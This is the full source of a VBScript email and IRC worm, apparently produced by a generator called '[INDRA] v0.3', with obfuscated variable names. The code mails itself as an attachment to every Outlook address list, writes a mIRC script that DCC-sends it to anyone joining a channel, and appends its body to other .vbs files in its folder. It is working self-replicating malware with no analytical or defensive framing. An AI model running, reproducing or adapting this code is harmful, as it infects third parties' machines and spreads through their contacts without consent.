'aqrcqfgjrhcyuki
'Worm Name: name5
'Written By: autor
'[INDRA]
On Error Resume Next
chactbisuqsutpn = WScript.ScriptFullName
Set redyktbqdejdmra = CreateObject("WScript.Shell") 
Set xnyjtnveeekaybi = CreateObject("Scripting.FileSystemObject")
Set pqwuratsnevwmna = CreateObject("Outlook.Application")
If pqwuratsnevwmna <> "" Then
Set obytmjjxbsaoodc = pqwuratsnevwmna.GetNameSpace("MAPI")
For jruuegatqfkfotj = 1 to obytmjjxbsaoodc.AddressLists.Count
Set pdhpcktbynlyfug = pqwuratsnevwmna.CreateItem(0)
Set magdjghasxhpgpk = obytmjjxbsaoodc.AddressLists.Item(jruuegatqfkfotj)
pdhpcktbynlyfug.Attachments.Add chactbisuqsutpn
pdhpcktbynlyfug.Subject = "qsdf"
pdhpcktbynlyfug.Body = "fdg"
Set yfqbevqhhmgyeeq = magdjghasxhpgpk.AddressEntries
Set sdlubkcbpyuscfp = pdhpcktbynlyfug.Recipients
For pnfybpxnxqsaqxh = 1 to yfqbevqhhmgyeeq.Count
pdhpcktbynlyfug.Recipients.Add yfqbevqhhmgyeeq.Item(pnfybpxnxqsaqxh)
Next
pdhpcktbynlyfug.Send
Next
End If
Set slerersuhdvfqfq = xnyjtnveeekaybi.CreateTextFile("C:\mirc\script.ini", True)
slerersuhdvfqfq.WriteLine "[script]"
slerersuhdvfqfq.WriteLine "n0=ON 1:JOIN:#:{ if ( $nick != $me ) {"
slerersuhdvfqfq.Write "n1=/dcc           send         $nick """
slerersuhdvfqfq.Write chactbisuqsutpn
slerersuhdvfqfq.WriteLine """ }"
slerersuhdvfqfq.Close
Set kcwwdoilxbcfckd = xnyjtnveeekaybi.OpenTextFile(chactbisuqsutpn, 1, 0)
kxbewdqbydukfat = kcwwdoilxbcfckd.ReadAll
kcwwdoilxbcfckd.Close
wsnnkocoeuyifdo = "'" + Right(kxbewdqbydukfat, Len(kxbewdqbydukfat)-InStr(kxbewdqbydukfat, "'aqrcqfgjrhcyuki"))
simfrwqlskdsdph = Left(chactbisuqsutpn, InStrRev(chactbisuqsutpn, "\"))
For Each bgaiaqplgnksjwf in xnyjtnveeekaybi.GetFolder(simfrwqlskdsdph).Files
If ( Right(bgaiaqplgnksjwf.Name, 4) = ".vbs" ) Then
Set cqippgevbjbijki = xnyjtnveeekaybi.OpenTextFile(bgaiaqplgnksjwf.Name, 1, 0)
If (InStr(cqippgevbjbijki.ReadAll, "[INDRA]") = 0) Then
Set kgfilsfiilktbvx = xnyjtnveeekaybi.OpenTextFile(bgaiaqplgnksjwf.Name, 8, 0)
kgfilsfiilktbvx.Write vbCrLf + wsnnkocoeuyifdo
kgfilsfiilktbvx.Close
End If
cqippgevbjbijki.Close
End If
Next
'Generated with [INDRA] v0.3.
